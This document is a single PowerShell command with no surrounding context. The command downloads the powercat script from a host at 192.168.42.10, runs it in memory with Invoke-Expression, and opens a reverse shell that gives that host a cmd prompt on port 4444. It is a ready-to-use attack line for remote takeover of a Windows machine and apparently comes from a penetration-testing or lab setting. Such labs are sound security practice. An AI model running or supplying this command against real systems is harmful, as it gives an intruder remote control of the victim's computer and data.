powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.42.10/powercat.ps1');powercat -c 192.168.42.10 -p 4444 -e cmd"
